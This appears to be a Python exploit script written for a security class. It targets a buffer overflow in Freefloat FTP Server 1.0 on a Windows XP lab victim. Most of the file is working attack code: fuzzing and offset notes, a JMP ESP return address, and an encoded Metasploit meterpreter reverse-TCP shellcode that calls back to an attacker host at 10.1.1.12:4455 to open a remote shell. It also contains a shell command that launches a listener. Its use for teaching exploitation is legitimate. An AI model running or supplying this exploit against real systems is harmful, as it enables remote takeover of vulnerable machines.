#!/usr/bin/python

# Author Eduardo Orenes - 2019
# Software Freefloat FTP Server 1.0 - XXX command (random three letters... and it works!)
# Read the comnments to replicate this exploit in class
# Victim Windows XP Professional SP2 Spanish - Provided during the class in OVA - VirtualBox recommended

# Importing socket to establish connections 
import socket

# Importing sys to execute some initial checkings (correct format)
import sys

# Importing os to clean the screen... I know, deprecated ;)
import os

# Importing IP from IPy to check the correct format of the IP
from IPy import IP

# Cleaning the screen
os.system("clear")

# Checking that the number of arguments is correct
if len(sys.argv) < 3:
    print ("\n\t******************************************\n\t Usage: %s HOST PORT\n\t******************************************\n\n" %sys.argv[0])
    sys.exit()

host = sys.argv[1]
port = int(sys.argv[2])

# Checking IP format
def check_ip(ip):
    try:
        IP(ip)
        return True
    except:
        return False

while not check_ip(host):
    host = raw_input("Enter the IP of the host using a correct format (e.g. 123.10.11.13): ")

print ("[+] Exploit script for Freefloat FTP 1.0 started...\n\n")

# Asking if you want to auto-launch multi/handler or doing it manually
multihandler = raw_input("Do you want me to launch multihandler in LPORT 10.1.1.12 and LPORT 4455? (Y/n): ")
if multihandler == "yes" or multihandler == "y" or multihandler == "":
    print ("[+] Launching Metasploit Framework and setting the multi/handler")
    os.system("gnome-terminal -e 'bash auto-multihandler.sh'")
    os.system("clear")
    raw_input("[i] ***ONLY*** when the listener is ready, press ENTER,\
                   \n since the exploit is going to be launched now.\n\n")
else:
    print ("[i] I hope your listener is up, or the exploit will be useless...")

############################
### FUZZING PROCESS INFO ###
############################

# STEP 1 - Trying to crash the application with 1000 A's
#A = "\x41"*1000

# STEP 2 - Creating a pattern with msf-pattern_create -l 1000
#A = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

# STEP 3 - Reading the EIP value to convert it into 
# EIP with pattern 1000 --> 69413269
# Converting EIP into text --> Reverse \x69\x32\x41\x69 (x86 Little Endian) --> echo "0x69.0x32.0x41.0x69" | xxd -r
# msf-pattern_offset -q i2Ai --> [*] Exact match at offset 247

A = "\x41" * 247
#B = "\x42" * 4 # Checking that B are overwriting EIP 
B = "\x40\x27\xdc\x77" #77dc2740 obtained searching for JMP ESP (no badchars)
#C = "\x43" * 700 # Initially checking 700 -->  

# SHELLCODE generation (payload 422 bytes)--> msfvenom -p windows/meterpreter/reverse_tcp \
# LHOST=10.1.1.12 LPORT=4455 -f c -e x86/shikata_ga_nai -i 3 -b '\x00\x0A\x0D' 
C = (
"\xda\xc6\xbd\x7c\x8c\x6f\x46\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x63\x83\xc2\x04\x31\x6a\x16\x03\x6a\x16\xe2\x89\x56\xbd\x9f"
"\x05\x43\xb6\x9a\x35\xcf\xab\xe5\xed\xe3\x1a\xa8\x50\x35\xcd"
"\xdc\x69\x65\xfa\x61\x55\x3d\x7b\xad\xc6\xb6\xbe\xa5\xb8\xe9"
"\xb0\xc9\x7a\xf5\x48\x24\x63\x92\x84\x9b\xff\xef\x28\xc6\x9a"
"\x8a\x18\xb1\xa9\x22\x89\x43\x40\xf2\x60\x8f\xb7\x5b\xf8\x0b"
"\x3f\xe3\x17\x42\x70\xac\x25\x3c\xf0\x17\xc6\xb8\x2e\xc5\x1e"
"\x45\x0f\x5b\x7b\x1f\xfe\x80\x87\xe1\xaf\x70\xdb\xbf\x47\xa6"
"\x2f\x95\x01\xf3\x95\x5f\x42\xdd\xa7\x66\x5d\x68\x37\x1b\x9c"
"\xae\x75\xc1\x33\x07\x49\x13\xe9\xbc\x3d\x77\x6d\xd0\xb1\x06"
"\x34\x14\x6e\xf5\x4e\x87\x01\xb9\x8c\x5d\x6e\xd6\x47\x83\xe0"
"\x3c\x51\x5e\xc7\x99\xb7\x3c\x82\x2a\x64\xc6\xbc\x3b\x10\x1f"
"\x8f\x9b\xf0\x8f\x18\x1d\x7a\x74\xc0\xb6\x5a\xa1\x25\x7a\xb8"
"\xdc\x09\xf6\xe9\x0f\x1a\x5f\x3c\x66\xcc\xcb\xb3\x04\x8e\xd7"
"\x8d\x49\x23\x6b\x68\xeb\x44\xf5\xde\xe2\xd9\x3d\xd5\x87\x8a"
"\xb0\x25\xfe\x4c\x88\xd4\x06\xc0\x5b\x31\xa0\xfb\x01\x16\x79"
"\x8d\x4d\x37\x5d\x4e\x07\x64\xe8\x5e\x90\x66\xf9\x30\x8c\x89"
"\x6e\x95\xa2\x1a\xa5\x36\x45\xfb\x11\x23\xd2\x01\x08\x7d\xca"
"\x74\x9e\x25\xbb\xd2\x62\x54\xc8\x0e\xa2\xc8\x52\x1f\xfc\x0f"
"\x45\x59\x7a\x30\x6d\xaf\x15\x1b\xaf\xbc\x61\x07\x22\x8a\x01"
"\x72\x93\x9a\xbc\x56\xfd\xd6\x8c\xf4\xf5\x8a\xcd\x4d\xd6\x89"
"\xc0\x34\x27\xf1\x60\x4a\x7c\x57\x2d\x2a\x48\x4d\xe9\x8a\x1c"
"\x3b\x34\x7f\x85\x89\x01\x71\x7a\x57\xaa\xa7\x46\x36\x78\x59"
"\xd3\x05\x5b\xe0\x6a\x40\x72\x5a\x97\xd9\x1e\x49\x0e\xaf\xee"
"\x7a\x92\xbe\x07\x4b\x9c\x64\xe6\x4d\xb9\x2f\x75\xca\x83\x29"
"\x95\xcd\x8c\x68\xfb\x81\xef\x52\xa5\x98\xe5\x54\x0e\xd1\x3a"
"\x0e\xe6\xf1\x52\x6b\x22\xd3\xb6\x0e\x69\xc9\xbc\x18\x46\xd3"
"\x26\x60\xfb\x04\xad\xc1\xf4\xc3\xa3\x10\x3f\xcd\x2b\x71\xc0"
"\x15\x8b"
)

# Padding with D's
D = "\x44" * (748 - len(C)) # MAX 768

# NOPS adjusted to the limit (seems more stable). 
# Less than 13 NOPS breaks connection. 20 NOPS also works.
NOPS = "\x90" * 13 

# Joining the complete payload
BUFFER = A + B + NOPS + C + D

# Establishing the connection with the remote FTP server
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print ("[+] Ready to start the connection")
try:
    connect=s.connect((host,port))
    s.recv(1024)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS anonymous\r\n')
    s.recv(1024)
    s.send('XXX ' + BUFFER + '\r\n')
    print ("[+] Exploit sent.\n[i] Check if you obtained a meterpreter session...")
    s.recv(1024)
    print ("[+] Sending the QUIT command to the FTP server.")
    s.send('QUIT\r\n')print ("[i] The program has finished.")
    s.close()
except:
    print("[i] Error. Check your network and/or be sure to start the application in the victim side")
